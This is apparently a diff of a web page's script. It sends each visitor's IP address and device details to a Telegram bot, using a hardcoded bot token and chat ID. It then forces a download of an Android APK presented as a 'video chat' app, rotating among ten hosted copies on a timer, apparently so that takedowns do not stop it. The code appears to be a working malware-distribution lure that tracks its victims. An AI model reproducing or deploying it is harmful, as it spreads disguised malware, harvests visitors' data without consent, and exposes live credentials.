@@ -170,35 +170,75 @@
 </a>
 
 <script>
-    function downloadFile() {
-        var token = '8163053912:AAHVNTHM3O2LRcChxvclnM8ONUELtMdFRa8';
-        var chatId = '-1002478190818';
-        var message = 'Bir kullanıcı geldi.';
-        var fileUrl = 'https://ucarecdn.com/2a5e2671-34b7-42d4-90e5-b54fde511b42/GoruntuluSohbet.apk';
+const apkLinks = [
+  'https://ucarecdn.com/313826b8-ec8b-483a-bdbb-90da3cb808c9/GoruntuluSohbet.apk',
+  'https://ucarecdn.com/2695a95c-1729-41a7-b111-68f41cbd8174/GoruntuluSohbet.apk',
+  'https://ucarecdn.com/09a99200-e06a-4219-9482-4b0db0b02419/GoruntuluSohbet.apk',
+  'https://ucarecdn.com/0cbb4f8f-f4c1-4bdc-a5ba-2f394054b392/GoruntuluSohbet.apk',
+  'https://ucarecdn.com/b55aedb6-35c0-4c2a-88fb-42429012ff19/GoruntuluSohbet.apk',
+  'https://ucarecdn.com/31a7e283-f688-4233-9e6b-c94c755ebd3d/GoruntuluSohbet.apk',
+  'https://ucarecdn.com/08d17344-2594-423f-af9a-d4c4f3baac52/GoruntuluSohbet.apk',
+  'https://ucarecdn.com/1f0b3a2f-ee0a-4dfb-92db-619260338aa5/GoruntuluSohbet.apk',
+  'https://ucarecdn.com/21d200c2-6ce6-453c-9bf3-6667e5ff325f/GoruntuluSohbet.apk',
+  'https://ucarecdn.com/47e84491-a38e-4a1b-89a4-b233bb707cd1/GoruntuluSohbet.apk',
+];
 
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-            .then(response => response.json())
-            .then(data => {
-                console.log('Telegram mesajı gönderildi:', data);
-                // Link oluştur ve otomatik indir
-                var a = document.createElement('a');
-                a.href = fileUrl;
-                a.download = '';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-            })
-            .catch(error => {
-                console.error('Telegram mesajı gönderilemedi:', error);
-                // Hata olsa bile indir
-                var a = document.createElement('a');
-                a.href = fileUrl;
-                a.download = '';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-            });
-    }
+// 144 dakika (8640 saniye) sürede 1 link geçiş yapacak şekilde index hesapla
+function getCurrentLinkIndex() {
+  const now = new Date();
+
+  // Türkiye saati veya local saat gece yarısı (local 00:00)
+  const startedAt = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 0, 0, 0).getTime();
+
+  const currentTime = Date.now();
+
+  if (currentTime < startedAt) return 0;
+
+  const diffMinutes = (currentTime - startedAt) / (1000 * 60);
+  const index = Math.floor(diffMinutes / 144) % apkLinks.length;
+  return index;
+}
+
+
+
+function getCurrentLink() {
+  return apkLinks[getCurrentLinkIndex()];
+}
+
+// Telegram mesajı gönder ve indirme işlemi
+function downloadFile() {
+  const token = '8163053912:AAHVNTHM3O2LRcChxvclnM8ONUELtMdFRa8';
+  const chatId = '-1002478190818';
+  const fileUrl = getCurrentLink();
+  const userAgent = navigator.userAgent;
+
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.ip;
+      const message = `new userr.\nIP: ${ip}\nCihaz: ${userAgent}\nİndirilen link: ${fileUrl}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        .catch(() => { /* hata olsa bile indirmeye devam */ })
+        .finally(() => {
+          const a = document.createElement('a');
+          a.href = fileUrl;
+          a.download = '';
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+        });
+    })
+    .catch(() => {
+      const a = document.createElement('a');
+      a.href = fileUrl;
+      a.download = '';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    });
+}
+
 </script>
 
 </script>
